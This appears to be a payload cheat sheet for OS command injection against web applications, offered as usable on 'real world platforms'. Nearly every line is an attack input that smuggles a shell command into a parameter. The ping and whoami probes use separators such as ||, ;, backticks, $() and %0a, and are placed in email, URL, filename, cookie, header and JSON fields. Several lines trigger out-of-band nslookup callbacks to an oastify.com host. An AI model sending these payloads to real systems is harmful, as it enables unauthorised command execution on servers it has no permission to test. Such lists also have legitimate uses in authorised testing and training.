#BELOW ARE SOME INJECTIONS WITH PARAMETERS WHICH AN ATTACKER CAN SNEAK A WORD OR NON-WORD-COMMANDS INTO, THAT CAN BE USED IN REAL WORLD PLATFORMS

Email field: starting with ||ping+-c+10+127.0.0.1||
foo@bar.com||ping+-c+10+127.0.0.1||
foo@bar.com%0aping+-c+10+127.0.0.1
foo@bar.com&&ping+-c+10+127.0.0.1&&

Phone number field
1234567890||ping+-c+10+127.0.0.1||
1234567890;ping+-c+10+127.0.0.1;

URL field** (common in webhook/callback params)
http://example.com||ping+-c+10+127.0.0.1||
http://example.com%0aping+-c+10+127.0.0.1
http://example.com$(ping+-c+10+127.0.0.1)

Numeric ID field
1||ping+-c+10+127.0.0.1||
1;ping+-c+10+127.0.0.1
1%0aping+-c+10+127.0.0.1

Filename field** (needs valid-looking extension)
report.pdf||ping+-c+10+127.0.0.1||
report.pdf;ping -c 10 127.0.0.1
report||ping+-c+10+127.0.0.1||.pdf

#SNEAKING WORD-COMMANDS (like whoami)

Query string
GET /product/stock?productId=1;whoami&storeId=1 HTTP/2
GET /product/stock?productId=1|whoami&storeId=1 HTTP/2
GET /product/stock?productId=1%0awhoami&storeId=1 HTTP/2
GET /product/stock?productId=1`whoami`&storeId=1 HTTP/2
GET /product/stock?productId=1$(whoami)&storeId=1 HTTP/2
GET /product/stock?productId=1;nslookup%20<id>.oastify.com&storeId=1 HTTP/2

Filename (multipart upload) - add these headers (entire lines one by one)
Content-Disposition: form-data; name="file"; filename="test;whoami.jpg"
Content-Disposition: form-data; name="file"; filename="test|whoami.jpg"
Content-Disposition: form-data; name="file"; filename="$(whoami).jpg"

Cookie values
Cookie: session=TRACKID; whoami
Cookie: session=$(whoami)
Cookie: TrackingId=xyz`whoami`

Header (Referer / X-Forwarded-For)
Referer: https://example.com; whoami
X-Forwarded-For: 127.0.0.1; whoami

Body (form-urlencoded)
productId=1;whoami&storeId=1
productId=1%0awhoami&storeId=1

Body (JSON)
{"productId": "1; whoami", "storeId": "1"}
{"productId": "1| whoami", "storeId": "1"}
{"productId": "1 && whoami", "storeId": "1"}
{"productId": "1; nslookup <id>.oastify.com", "storeId": "1"}

Header (User-Agent)
User-Agent: Mozilla/5.0; whoami
User-Agent: Mozilla/5.0`whoami`
User-Agent: Mozilla/5.0; nslookup <id>.oastify.com
